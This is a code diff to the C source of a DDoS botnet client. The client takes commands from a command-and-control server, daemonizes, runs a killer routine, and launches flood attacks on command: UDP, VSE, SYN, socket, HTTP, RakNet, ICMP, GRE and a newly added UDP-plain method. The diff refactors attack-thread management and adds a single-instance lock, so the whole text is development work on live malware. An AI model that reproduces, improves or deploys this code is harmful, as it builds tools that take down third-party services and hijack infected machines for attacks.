@@ -6,8 +6,8 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <unistd.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <time.h>
@@ -15,6 +15,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <poll.h>
+#include <stdint.h>
 #include "headers/syn_attack.h"
 #include "headers/udp_attack.h"
 #include "headers/http_attack.h"
@@ -26,9 +27,11 @@
 #include "headers/icmp_attack.h"
 #include "headers/killer.h"
 #include "headers/gre_attack.h"
+#include "headers/connection_lock.h"
+#include "headers/udpplain_attack.h"
 
-#define CNC_IP "1.1.1.1"
-#define BOT_PORT 50358
+#define CNC_IP "127.0.0.1"
+#define BOT_PORT 1338
 #define MAX_THREADS 1
 #define RETRY_DELAY 2
 #define RECV_TIMEOUT_MS 12000
@@ -38,10 +41,15 @@
 #define FAST_RETRY_COUNT 5
 #define FAST_RETRY_DELAY 1
 
-pthread_t attack_threads[MAX_THREADS] = {0};
+typedef struct {
+    pthread_t thread;
+    void* params;
+    int active;
+    int type;  
+} attack_thread_state;
+
+static attack_thread_state thread_states[MAX_THREADS];
 pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;
-attack_params* thread_params[MAX_THREADS] = {NULL};
-gre_attack_params* gre_params[MAX_THREADS] = {NULL};
 
 const char* get_arch() {
     #ifdef ARCH_aarch64
@@ -73,44 +81,98 @@ const char* get_arch() {
     #endif
 }
 
+static void init_thread_states() {
+    memset(thread_states, 0, sizeof(thread_states));
+    for (int i = 0; i < MAX_THREADS; i++) {
+        thread_states[i].thread = 0;
+        thread_states[i].params = NULL;
+        thread_states[i].active = 0;
+        thread_states[i].type = -1;
+    }
+}
+
 void cleanup_attack_threads() {
     pthread_mutex_lock(&thread_mutex);
     for (int i = 0; i < MAX_THREADS; i++) {
-        if (attack_threads[i] != 0) {
-            if (thread_params[i]) {
-                thread_params[i]->active = 0;
+        if (thread_states[i].thread != 0) {
+            if (thread_states[i].params) {
+                if (thread_states[i].type == 0) {
+                    ((attack_params*)thread_states[i].params)->active = 0;
+                } else if (thread_states[i].type == 1) {
+                    ((gre_attack_params*)thread_states[i].params)->active = 0;
+                }
             }
-            if (gre_params[i]) {
-                gre_params[i]->active = 0;
+            
+            pthread_join(thread_states[i].thread, NULL);
+            
+            if (thread_states[i].params) {
+                free(thread_states[i].params);
             }
-            pthread_join(attack_threads[i], NULL);
-            if (thread_params[i]) {
-                free(thread_params[i]);
-                thread_params[i] = NULL;
-            }
-            if (gre_params[i]) {
-                free(gre_params[i]);
-                gre_params[i] = NULL;
-            }
-            attack_threads[i] = 0;
+            
+            thread_states[i].thread = 0;
+            thread_states[i].params = NULL;
+            thread_states[i].active = 0;
+            thread_states[i].type = -1;
         }
     }
     pthread_mutex_unlock(&thread_mutex);
 }
 
+static attack_params* create_attack_params(const char *ip, uint16_t port, int duration, int psize, int srcport) {
+    attack_params* params = calloc(1, sizeof(attack_params));
+    if (!params) return NULL;
+
+    params->target_addr.sin_family = AF_INET;
+    params->target_addr.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
+        free(params);
+        return NULL;
+    }
+    
+    params->duration = duration;
+    params->psize = psize;
+    params->srcport = srcport;
+    params->active = 1;
+    
+    return params;
+}
+
+static gre_attack_params* create_gre_params(const char *ip, int duration, int psize, int srcport, int gre_proto, int gport) {
+    gre_attack_params* params = calloc(1, sizeof(gre_attack_params));
+    if (!params) return NULL;
+    
+    params->target_addr.sin_family = AF_INET;
+    params->target_addr.sin_port = htons(gport);
+    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
+        free(params);
+        return NULL;
+    }
+    
+    params->duration = duration;
+    params->psize = psize;
+    params->srcport = srcport;
+    params->gre_proto = gre_proto;
+    params->gport = gport;
+    params->active = 1;
+    
+    return params;
+}
+
 void handle_command(char* command, int sock) {
     if (!command || strlen(command) > 1023) return;
+    
     static char buffer[256];
     if (strncmp(command, "ping", 4) == 0) {
         snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
         send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
         return;
     }
-    static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
-    static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
+    
+    static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre", "!udpplain"};
+    static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4, 8};
     static void* (*attack_funcs[])(void*) = {
         udp_attack, vse_attack, syn_attack, socket_attack, 
-        http_attack, raknet_attack, icmp_attack, gre_attack
+        http_attack, raknet_attack, icmp_attack, gre_attack, udpplain_attack
     };
     
     if (strcmp(command, "stop") == 0) {
@@ -119,7 +181,7 @@ void handle_command(char* command, int sock) {
     }
 
     int which = -1;
-    for (int i = 0; i < 8; i++) {
+    for (int i = 0; i < 9; i++) {
         if (strncmp(command, methods[i], method_len[i]) == 0) {
             which = i;
             break;
@@ -164,52 +226,35 @@ void handle_command(char* command, int sock) {
         cleanup_attack_threads();
         
         pthread_mutex_lock(&thread_mutex);
-        if (which == 7) {
-            gre_attack_params* gre_state = malloc(sizeof(gre_attack_params));
-            if (!gre_state) {
+        if (which == 7) {  // GRE attack
+            gre_attack_params* params = create_gre_params(ip, time, psize, srcport, gre_proto, gport);
+            if (!params) {
                 pthread_mutex_unlock(&thread_mutex);
                 return;
             }
-            gre_state->target_addr.sin_family = AF_INET;
-            gre_state->target_addr.sin_port = htons(port);
-            inet_pton(AF_INET, ip, &gre_state->target_addr.sin_addr);
-            gre_state->duration = time;
-            gre_state->psize = psize;
-            gre_state->srcport = srcport;
-            gre_state->gre_proto = gre_proto;
-            gre_state->gport = gport;
-            gre_state->active = 1;
             
-            gre_params[0] = gre_state;
-            int ret = pthread_create(&attack_threads[0], NULL, gre_attack, gre_state);
+            int ret = pthread_create(&thread_states[0].thread, NULL, gre_attack, params);
             if (ret != 0) {
-                free(gre_state);
-                gre_params[0] = NULL;
+                free(params);
+            } else {
+                thread_states[0].params = params;
+                thread_states[0].active = 1;
+                thread_states[0].type = 1;
             }
-        } else {
-            attack_params* attack_state = calloc(1, sizeof(attack_params));
-            if (!attack_state) {
+        } else {  
+            attack_params* params = create_attack_params(ip, port, time, psize, srcport);
+            if (!params) {
                 pthread_mutex_unlock(&thread_mutex);
                 return;
             }
             
-            attack_state->target_addr.sin_family = AF_INET;
-            attack_state->target_addr.sin_port = htons(port);
-            if (inet_pton(AF_INET, ip, &attack_state->target_addr.sin_addr) != 1) {
-                free(attack_state);
-                pthread_mutex_unlock(&thread_mutex);
-                return;
-            }
-            attack_state->duration = time;
-            attack_state->psize = psize;
-            attack_state->srcport = srcport;
-            attack_state->active = 1;
-            
-            thread_params[0] = attack_state;
-            int ret = pthread_create(&attack_threads[0], NULL, attack_funcs[which], attack_state);
+            int ret = pthread_create(&thread_states[0].thread, NULL, attack_funcs[which], params);
             if (ret != 0) {
-                free(attack_state);
-                thread_params[0] = NULL;
+                free(params);
+            } else {
+                thread_states[0].params = params;
+                thread_states[0].active = 1;
+                thread_states[0].type = 0;
             }
         }
         pthread_mutex_unlock(&thread_mutex);
@@ -259,21 +304,31 @@ int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int
     return 0;
 }
 
-int main(int argc, char** argv) {
+int main(int argc __attribute__((unused)), char** argv __attribute__((unused))) {
+    init_thread_states();
+    
     static int sock = -1;
     static struct sockaddr_in server_addr;
     static char command[1024];
     ssize_t n;
+    int lock_fd;
 
     daemonize(argc, argv);
     start_killer();
+    
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
-    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
-    
+    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) != 1) {
+        return 1;
+    }
 
     int reconnect_attempts = 0;
     time_t last_ping = 0;
+
+    lock_fd = acquire_connection_lock();
+    if (lock_fd < 0) {
+        return 0;
+    }
 
     while (1) {
         if (sock != -1) {
@@ -400,4 +455,7 @@ int main(int argc, char** argv) {
         }
         sleep(RETRY_DELAY);
     }
+
+    release_connection_lock(lock_fd);
+    return 0;
 }
